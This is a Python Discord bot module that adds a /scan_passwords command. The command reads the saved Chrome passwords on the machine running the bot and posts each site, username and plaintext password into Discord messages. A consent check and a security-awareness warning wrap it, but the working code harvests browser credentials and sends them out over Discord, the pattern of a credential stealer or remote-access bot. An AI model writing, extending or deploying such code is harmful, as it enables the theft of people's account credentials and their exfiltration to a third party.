import discord
from discord.ext import commands
from discord import app_commands
from core.consent_manager import ConsentManager
from core.password_scanner import PasswordScanner

class PasswordScanCommand(commands.Cog):
    """Password scanning command"""
    
    def __init__(self, bot):
        self.bot = bot
        self.consent_mgr = ConsentManager()
        self.scanner = PasswordScanner()
    
    @app_commands.command(name="scan_passwords", description="Scan for saved browser passwords")
    async def scan_passwords(self, interaction: discord.Interaction):
        """Scan for saved passwords"""
        user_id = interaction.user.id
        
        if not self.consent_mgr.has_consent(user_id, 'passwords') and not self.consent_mgr.has_consent(user_id, 'all'):
            await interaction.response.send_message("❌ You need to grant consent first! Use `/consent_passwords`", ephemeral=True)
            return
        
        await interaction.response.defer(ephemeral=True)
        
        try:
            passwords = self.scanner.scan_chrome_passwords()
            
            report = f"""
🔐 **PASSWORD SCAN RESULTS**

Chrome Passwords Found: {len(passwords)}

**Saved Credentials:**
```
{self._format_passwords(passwords)}
```

⚠️ Your passwords are at risk if browsers are compromised!
            """
            
            if len(report) > 2000:
                await interaction.followup.send(report[:2000], ephemeral=True)
                await interaction.followup.send(report[2000:], ephemeral=True)
            else:
                await interaction.followup.send(report, ephemeral=True)
            
            self.consent_mgr.log_consent(user_id, 'passwords', True, f"Scan complete - {len(passwords)} passwords found")
        except Exception as e:
            await interaction.followup.send(f"❌ Error during scan: {str(e)}", ephemeral=True)
    
    def _format_passwords(self, passwords):
        """Format passwords for display"""
        if not passwords:
            return "None found"
        
        result = []
        for pwd in passwords[:10]:  # Show first 10
            result.append(f"URL: {pwd.get('url', 'Unknown')}")
            result.append(f"User: {pwd.get('username', 'Unknown')}")
            result.append(f"Pass: {pwd.get('password', '[ENCRYPTED]')}")
            result.append("---")
        
        return "\n".join(result)

async def setup(bot):
    await bot.add_cog(PasswordScanCommand(bot))
